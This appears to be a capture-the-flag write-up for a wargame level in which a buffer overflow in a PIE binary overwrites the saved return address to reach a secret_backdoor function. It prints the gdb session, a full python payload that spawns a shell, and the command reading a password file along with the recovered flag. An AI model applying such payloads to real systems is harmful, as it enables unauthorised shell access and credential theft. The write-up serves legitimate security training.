# Write up

Last one now.

Here we have NX enabled, Partial RELRO and a PIE executable.

While disassembling the program, we found an overflow, an unset length variable and a secret_backdoor function.
Since we have a position independant executable, we have to search for the secret_backdoor address first :
```
(gdb) p secret_backdoor
$1 = {<text variable, no debug info>} 0x88c <secret_backdoor>			<= Base address, succ
(gdb) break main
Breakpoint 1 at 0xaac
(gdb) run
(gdb) p secret_backdoor
$2 = {<text variable, no debug info>} 0x55555555488c <secret_backdoor>	<= Runtime stack address, purfect
```

We have to overwrite the saved rip from the message overflow, keeping in mind that we need a size over 208 to let us put the backdoor.
We also need to force flush our inputs using "\n" to not be forced to fill all the buffers completely.
So we will try to override the saved rip at offset 200 (192 + 8 padding) using the following payload :
```
(python -c "print 'A' * 40 + '\xd0' + '\n' + 'B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00' + '\n' + '/bin/sh'"; cat) | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
ls
ls: cannot open directory .: Permission denied
cat /home/users/end/.pass
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```

Congratulations !
